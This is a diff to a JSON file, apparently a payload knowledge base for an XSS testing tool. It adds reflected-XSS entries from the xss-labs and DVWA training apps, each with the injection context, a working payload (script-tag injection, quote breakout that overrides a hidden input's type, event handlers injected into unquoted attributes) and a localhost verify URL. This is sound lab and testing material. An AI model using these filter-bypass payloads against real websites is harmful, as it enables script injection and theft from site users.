@@ -185,5 +185,37 @@
     "principle": "HTML 正文上下文直接注入 script 标签，无过滤",
     "source": "DVWA",
     "verify_url": "http://localhost:8081/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+  },
+  {
+    "id": "auto-20261014231459",
+    "context": "反射型 XSS：GET 参数 name 的值被原样输出到 HTML 文本节点中，无任何编码/过滤（xss-labs level1）",
+    "reference_payload": "<script>alert(1)</script>",
+    "principle": "参数值未经 HTML 实体编码直接拼接进页面，<script> 标签被浏览器当作代码执行",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level1.php?name={payload}"
+  },
+  {
+    "id": "auto-20261014232224",
+    "context": "xss-labs level10：反射点落在隐藏输入框 <input name=\"t_sort\" value=\"REFLECT\" type=\"hidden\"> 的 value 属性内（双引号闭合），服务端过滤了 < 和 >，无法注入标签；hidden 元素使事件永不触发",
+    "reference_payload": "\" type=\"text\" onmouseover=\"alert(1)",
+    "principle": "先闭合 value 属性的双引号逃出属性，再用 type=\"text\" 覆盖 hidden 让元素可交互（hidden 元素不触发事件），最后挂 onmouseover 事件处理器；无需 < > 即执行",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level10.php?t_sort={payload}"
+  },
+  {
+    "id": "auto-20261015003339",
+    "context": "xss-labs level17：arg01/arg02 拼接进 <embed src=xsf01.swf?<arg01>=<arg02> width=100% heigth=100%> 的无引号属性值区。过滤：< > \" 被实体编码（&lt; &gt; &quot;），但空格未被过滤。无引号属性上下文中，空格可分隔出新的真实属性。",
+    "reference_payload": "arg02=BBB onmouseover=alert(1)",
+    "principle": "无引号属性内用空格分隔注入事件属性（onmouseover），引号被实体编码不影响无引号上下文的属性分隔；鼠标悬停触发 JS。",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level17.php?arg01=AAA&arg02=BBB%20onmouseover=alert(1)"
+  },
+  {
+    "id": "auto-20261015004836",
+    "context": "反射型：arg01/arg02 拼接进未闭合的 <embed src=xsf02.swf?arg01=arg02 width=100% heigth=100%> 的无引号属性值区。服务端对 < > \" 做 HTML 实体编码（&lt;&gt;&quot;），但空格原样保留，无法标签 breakout。关键：embed 标签未闭合。",
+    "reference_payload": "arg02=BBB onmouseover=alert(1)",
+    "principle": "无引号属性值区用空格分隔注入事件属性；< > \" 被实体编码但空格保留，直接在 embed 上挂 onmouseover（verify 工具自动 hover 触发）",
+    "source": "xss-labs level18",
+    "verify_url": "http://localhost:8080/level18.php?arg01=AAA&arg02=BBB onmouseover=alert({payload})"
   }
 ]
